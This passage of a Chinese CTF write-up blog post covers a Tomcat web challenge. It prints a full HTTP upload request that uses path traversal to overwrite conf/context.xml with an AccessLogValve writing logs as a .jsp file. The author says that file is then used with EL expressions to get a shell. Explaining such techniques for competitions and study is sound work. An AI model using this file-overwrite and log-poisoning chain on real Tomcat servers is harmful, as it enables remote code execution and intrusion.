+<h2 id="Tomcat-0解"><a href="#Tomcat-0解" class="headerlink" title="Tomcat(0解)"></a>Tomcat(0解)</h2><p>这道题是0解题, 和上个题目一样, 只是不让覆盖<code>web.xml</code>, 赛后本地复现成功, 比赛环境已经无法打开了. 题目过滤了<code>web.xml</code>, 但是可以覆盖<code>TOMCAT根目录/conf/context.xml</code>, 对<code>context.xml</code>官方文档: <a class="link"   target="_blank" rel="noopener" href="https://tomcat.apache.org/tomcat-8.5-doc/config/valve.html#Access_Logging![%E5%9B%BE%E7%89%87](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn53icOIq26mEFPonY2voERAK3g0zCzpmRGVWDL50GLYFyia92Rjc3xla4AfPf9lOVJnibTaSv0dub0xA/640?wx_fmt=png&from=appmsg&tp=wxpic&wxfrom=5&wx_lazy=1)%60context.xml%60%E5%8F%AF%E4%BB%A5%E9%85%8D%E7%BD%AE%60%E6%97%A5%E5%BF%97%E6%96%87%E4%BB%B6%60%E6%89%80%E5%9C%A8%E7%9B%AE%E5%BD%95" >https://tomcat.apache.org/tomcat-8.5-doc/config/valve.html#Access_Logging![图片](https://mmbiz.qpic.cn/sz_mmbiz_png/tiaKRx8m4Wn53icOIq26mEFPonY2voERAK3g0zCzpmRGVWDL50GLYFyia92Rjc3xla4AfPf9lOVJnibTaSv0dub0xA/640?wx_fmt=png&amp;from=appmsg&amp;tp=wxpic&amp;wxfrom=5&amp;wx_lazy=1)`context.xml`可以配置`日志文件`所在目录 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>, 以及后缀, 并且配置成<code>combined</code>会记录<code>UA</code>, 那么思路就容易了, 覆盖<code>context.xml</code>, 记录<code>1.日志.jsp</code>文件到<code>myapp</code>目录下, 如下<code>HTTP</code>包:</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">POST /myapp/upload?path=../../conf/ HTTP/1.1</span><br><span class="line">Host: 139.155.126.78:34978</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:129.0) Gecko/20100101 Firefox/129.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------37883986588452936881633821837</span><br><span class="line">Content-Length: 1565</span><br><span class="line">Origin: http://139.155.126.78:34978</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://139.155.126.78:34978/myapp/upload.html</span><br><span class="line">Cookie: JSESSIONID=DB25C11DF76FEB4A01D0FEC794C0E52B</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Priority: u=0, i</span><br><span class="line"></span><br><span class="line">-----------------------------37883986588452936881633821837</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;context.xml&quot;</span><br><span class="line">Content-Type: text/xml</span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;!--</span><br><span class="line">  Licensed to the Apache Software Foundation (ASF) under one or more</span><br><span class="line">  contributor license agreements.  See the NOTICE file distributed with</span><br><span class="line">  this work for additional information regarding copyright ownership.</span><br><span class="line">  The ASF licenses this file to You under the Apache License, Version 2.0</span><br><span class="line">  (the &quot;License&quot;); you may not use this file except in compliance with</span><br><span class="line">  the License.  You may obtain a copy of the License at</span><br><span class="line"></span><br><span class="line">      http://www.apache.org/licenses/LICENSE-2.0</span><br><span class="line"></span><br><span class="line">  Unless required by applicable law or agreed to in writing, software</span><br><span class="line">  distributed under the License is distributed on an &quot;AS IS&quot; BASIS,</span><br><span class="line">  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.</span><br><span class="line">  See the License for the specific language governing permissions and</span><br><span class="line">  limitations under the License.</span><br><span class="line">--&gt;</span><br><span class="line">&lt;!-- The contents of this file will be loaded for each web application --&gt;</span><br><span class="line">&lt;Context&gt;</span><br><span class="line">    &lt;Valve className=&quot;org.apache.catalina.valves.AccessLogValve&quot; directory=&quot;logs&quot; prefix=&quot;../webapps/myapp/1&quot; suffix=&quot;.jsp&quot; pattern=&quot;combined&quot; /&gt;</span><br><span class="line">    &lt;WatchedResource&gt;WEB-INF/web.xml&lt;/WatchedResource&gt;</span><br><span class="line">    &lt;WatchedResource&gt;$&#123;catalina.base&#125;/conf/web.xml&lt;/WatchedResource&gt;</span><br><span class="line">    &lt;!-- Uncomment this to disable session persistence across Tomcat restarts --&gt;</span><br><span class="line">    &lt;!--</span><br><span class="line">    &lt;Manager pathname=&quot;&quot; /&gt;</span><br><span class="line">    --&gt;</span><br><span class="line">&lt;/Context&gt;</span><br><span class="line">-----------------------------37883986588452936881633821837--</span><br></pre></td></tr></table></figure></div>
+
+<p>最终运行结果:</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250812132632141.png"
+                      alt="image-20250812132632141"
+                ></p>
+<p>最终写入日志, 配合 EL 表达式 GETSHELL</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="C:\Users\27284\AppData\Roaming\Typora\typora-user-images\image-20250812132511640.png"
+                      alt="image-20250812132511640"
+                ></p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 2024羊城杯WP</li>
+        <li><strong>Author:</strong> xiaolaisec</li>
+        <li><strong>Created at
+                :</strong> 2024-10-12 15:08:05</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2025-08-19 18:28:27
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://redefine.ohevan.com/2024/10/12/2024羊城杯WP/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/JAVA/">#JAVA</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/PHP/">#PHP</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/Python/">#Python</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2024/11/20/2024%E5%B9%B4%E6%B5%99%E6%B1%9F%E7%9C%81%E7%9C%81%E8%B5%9BWP/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">2024年浙江省省赛WP</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
+                <div class="comments-container mt-10 w-full ">
+    <div id="comment-anchor" class="w-full h-2.5"></div>
+    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
+        Comments
+    </div>
+    
+
+        
+            
+    <div id="waline"></div>
+    <script type="module" data-swup-reload-script>
+      import { init } from '/js/libs/waline.mjs';
+
+      function loadWaline() {
+        init({
+          el: '#waline',
+          serverURL: 'https://example.example.com',
+          lang: 'zh-CN',
+          dark: 'body[class~="dark-mode"]',
+          requiredMeta: ['nick', 'mail'],
+          emoji: [],
+          
+          
+        });
+      }
+
+      if (typeof swup !== 'undefined') {
+        loadWaline();
+      } else {
+        window.addEventListener('DOMContentLoaded', loadWaline);
+      }
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">2024羊城杯WP</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#WEB"><span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Lyrics-For-You"><span class="nav-text">Lyrics For You</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ez-java"><span class="nav-text">ez_java</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E4%BF%A1%E6%81%AF"><span class="nav-text">题目信息</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%AF%E5%8A%A8%E8%84%9A%E6%9C%AC"><span class="nav-text">启动脚本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#WriteUp"><span class="nav-text">WriteUp</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tomtom2"><span class="nav-text">tomtom2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Tomcat-0%E8%A7%A3"><span class="nav-text">Tomcat(0解)</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2022</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">xiaolaisec</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://cn.vercount.one/js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
